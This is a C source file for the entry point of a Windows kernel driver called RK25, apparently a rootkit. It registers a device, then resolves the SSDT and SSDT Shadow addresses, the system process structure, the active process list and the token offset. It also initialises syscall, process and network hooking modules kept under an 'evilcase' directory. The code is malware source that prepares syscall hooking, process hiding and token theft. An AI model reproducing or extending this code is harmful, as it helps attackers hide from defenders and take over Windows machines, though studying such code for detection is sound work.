#define _CRT_SECURE_NO_WARNINGS
//#pragma comment(linker, "/ignore:2001")
//#pragma comment(linker, "/ignore:1120")

#include <ntddk.h>
#include "common/rk25_dbg.h"
#include "dispatch/ioctl/rk25_dispatcher.h"
#include "evilcase/common/system/kernel/rk25_kernel.h"
#include "evilcase/process/rk25_proc.h"
#include "evilcase/net/rk25_net.h"

#define RK25_SYM_LINK		L"\\??\\rk25"
#define RK25_DEVICE_NAME	L"\\Device\rk25"

#define RK25_DBG_PROLOG_ENTRY "RK25 Driver"

UNICODE_STRING glDeviceName;
UNICODE_STRING glSymLinkName;

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING registryPath);
NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
NTSTATUS DispatchClose(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject);

NTSTATUS CompleteIrp(PIRP pIrp, NTSTATUS status, ULONG info);

VOID RK25Init();
VOID RK25Free();

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING registryPath) {
	PDEVICE_OBJECT	pDeviceObject;
	NTSTATUS		status = STATUS_SUCCESS;
	OSVERSIONINFOEX osvi = { 0 };

	pDriverObject->DriverUnload = DriverUnload;
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDispatch;

	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "Load driver % wZ", &pDriverObject->DriverName);
	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "Registry path %wZ", registryPath);

	RtlInitUnicodeString(&glDeviceName, RK25_DEVICE_NAME);
	RtlInitUnicodeString(&glSymLinkName, RK25_SYM_LINK);

	status = IoCreateDevice(
		pDriverObject,
		0,
		&glDeviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&pDeviceObject
	);

	if (!NT_SUCCESS(status)) {
		RK25_DBG_ERR_F(RK25_DBG_PROLOG_ENTRY, "Unable to create device with status: 0x%X", status);
		return status;
	}

	pDeviceObject->Flags |= DO_BUFFERED_IO;

	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "Create device %wZ", &glDeviceName);

	status = IoCreateSymbolicLink(&glSymLinkName, &glDeviceName);
	if (!NT_SUCCESS(status)) {
		RK25_DBG_ERR_F(RK25_DBG_PROLOG_ENTRY, "Unable to create symbolic link with status: 0x%X", status);
		IoDeleteDevice(pDeviceObject);
		return status;
	}

	// Initial OS Switcher
	status = RK25GetOSVersion(&osvi);
	if (!NT_SUCCESS(status)) {
		RK25_DBG_ERR_F(RK25_DBG_PROLOG_ENTRY, "Unable to get OS version with status: 0x%X", status);
		IoDeleteDevice(pDeviceObject);
		return status;
	}
	// RK25PrintDebugOSVersion(&osvi);
	RK25PrintDebugOSVersionByCode(RK25GetOSVersionCode(&osvi));

	RK25Init();

	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "KernelBase:\t\t0x%p", RK25GetKernelBaseAddress());
	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "SSDT pointer:\t\t0x%p", RK25GetSSDTAddress());
	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "SSDT Shadow pointer:\t0x%p", RK25GetSSDTShadowAddress());
	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "System _EPROCESS:\t\t0x%p", RK25GetSystemEProcAddress());
	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "PsActiveProcessHead:\t0x%p", RK25GetActiveProcessHead());
	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "System APL (offset):\t0x%p (+0x%04X)", RK25GetActiveProcessLinks(), RK25GetOffsetToAPL());
	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "System token:\t\t0x%p (+0x%04X)", (PUCHAR)(RK25GetSystemEProcAddress()) + RK25GetOffsetToToken(), RK25GetOffsetToToken());

	RK25_DBG_INFO_F(RK25_DBG_PROLOG_ENTRY, "Create symbolic link %wZ", &glSymLinkName);
	RK25_DBG_INFO(RK25_DBG_PROLOG_ENTRY, "Success register driver");
	return status;
}

/*
* Dispetcher IRP_MJ_CREATE
*/
NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION IrpStack;
	ULONG info = 0;

	IrpStack = IoGetCurrentIrpStackLocation(pIrp);

	RK25_DBG_INFO(RK25_DBG_PROLOG_ENTRY, "DispatchCreate called");
	return CompleteIrp(pIrp, status, info);
}

/*
* Dispetcher IRP_MJ_CLOSE
*/
NTSTATUS DispatchClose(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION IrpStack;
	ULONG info = 0;

	IrpStack = IoGetCurrentIrpStackLocation(pIrp);

	RK25_DBG_INFO(RK25_DBG_PROLOG_ENTRY, "DispatchClose called");
	return CompleteIrp(pIrp, status, info);
}

/*
* Dispetcher UNLOAD
*/
VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject) {
	IoDeleteSymbolicLink(&glSymLinkName);
	IoDeleteDevice(pDriverObject->DeviceObject);

	RK25Free();

	RK25_DBG_INFO(RK25_DBG_PROLOG_ENTRY, "Driver unloaded");
}

NTSTATUS CompleteIrp(PIRP pIrp, NTSTATUS status, ULONG info) {
	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = info;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

VOID RK25Init() {
	// Initial Kernel Searcher
	RK25InitializeKernelRoutine();

	// Initial syscall list
	RK25QueueSyscallInit();

	// Iinital process list's
	RK25ProcessInit();

	// Initial net list's
	RK25NetInit();
}

VOID RK25Free() {
	// Remove syscall list
	RK25QueueSyscallFree();

	// Free lists and remove hooks
	RK25ProcessFree();

	// Free lists and remove hooks
	RK25NetFree();
}